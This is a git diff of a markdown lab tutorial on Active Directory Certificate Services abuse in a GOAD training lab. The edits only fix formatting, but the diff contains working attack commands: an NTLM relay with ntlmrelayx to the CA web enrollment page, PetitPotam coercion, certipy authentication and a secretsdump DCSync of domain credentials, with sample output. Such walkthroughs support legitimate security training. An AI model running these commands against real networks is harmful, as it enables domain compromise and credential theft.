@@ -46,7 +46,7 @@ In this unified module, we will deconstruct the entire spectrum of ADCS abuse, s
 Before we move on, let’s have a quick stop and setup our lab, this way we can make sure that our environment is ready for all **ESCs** abuses. We should go to our **GOAD** and run the following **`.yml`**.
 Once we have successfuly configure our environment, we can move on…
 
-```plain text
+``` text
 goad> cd <instance_id>
 goad (instance)> provision ad-data.yml
 goad (instance)> provision ad-relations.yml
@@ -527,7 +527,7 @@ PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC
 
 That’s great. Now let’s start `ntlmrelayx` tool to listen and relay SMB authetication to HTTP.
 
-`[ntlmrelayx.py](http://ntlmrelayx.py/)`` -t ``[http://10.4.10.23/certsrv/certnsh.asp](http://192.168.56.23/certsrv/certnsh.asp)`` -smb2support --adcs --template DomainController`
+`ntlmrelayx.py -t http://10.4.10.23/certsrv/certnsh.asp -smb2support --adcs --template DomainController`
 
 Launch the coerce with [petitpotam](https://github.com/topotam/PetitPotam) unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same)
 
@@ -547,9 +547,9 @@ Since we already have the Certificate, let’s add it into a file and user [gett
 
 And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.
 
-`[secretsdump.py](http://secretsdump.py/)`` -k -no-pass 'ESSOS.LOCAL'/'meereen$'@'meereen.essos.local'`
+`secretsdump.py -k -no-pass 'ESSOS.LOCAL'/'meereen$'@'meereen.essos.local'`
 
-```bash
+```
 [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -608,7 +608,7 @@ Let’s do the same attack with [certipy](https://github.com/ly4k/Certipy), setu
 
 Now we trig the coerce.
 
-`python3 ``[PetitPotam.py](http://petitpotam.py/)`` 10.4.10.1 meereen.essos.local`
+`python3 PetitPotam.py 10.4.10.1 meereen.essos.local`
 
 ![screenshot_38.png](./images/screenshot_38.png)
 
@@ -617,7 +617,7 @@ Let’s request the Ticket Granting Ticket the Certificate .pfx.
 
 `sudo certipy auth -pfx meereen.pfx -dc-ip 10.4.10.12`
 
-```bash
+```
 [*] Using principal: meereen$@essos.local
 [*] Trying to get TGT...
 [*] Got TGT
@@ -632,7 +632,7 @@ Let’s request the Ticket Granting Ticket the Certificate .pfx.
 
 Now that we were able to  request the TGT from the Domain Controller we can launch a DCsync with secretsdump.
 
-`[secretsdump.py](http://secretsdump.py/)`` -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`
+`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`
 
 ### Time Skew
 
